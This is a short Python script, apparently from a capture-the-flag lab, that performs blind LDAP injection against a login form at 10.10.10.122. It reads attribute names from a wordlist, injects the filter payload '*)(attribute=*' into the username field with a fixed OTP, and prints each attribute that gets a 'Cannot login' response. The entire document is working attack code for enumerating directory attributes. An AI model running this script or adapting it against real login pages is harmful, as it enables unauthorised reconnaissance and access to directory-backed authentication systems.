#!/usr/bin/python

import re
import requests
import urllib
import time

def main(): 
  with open("LDAP_attributes.txt") as f:
    attributes = f.read().splitlines()
  for attribute in attributes:
    payload = "*)({}=*".format(attribute)
    data = {
     "inputUsername": urllib.quote(payload),
     "inputOTP": "000000",
    }
    time.sleep(0.3)  
    a = requests.post("http://10.10.10.122/login.php", data=data)
    b = re.search(r'<form action="/login.php" method="post" >\s+<div class="form-group row">\s+<div class="col-sm-10">\s+(.*)</div>', a.text)
    if "Cannot login" in (b.group(1)):
      print(attribute) 

if __name__== "__main__":
 main()

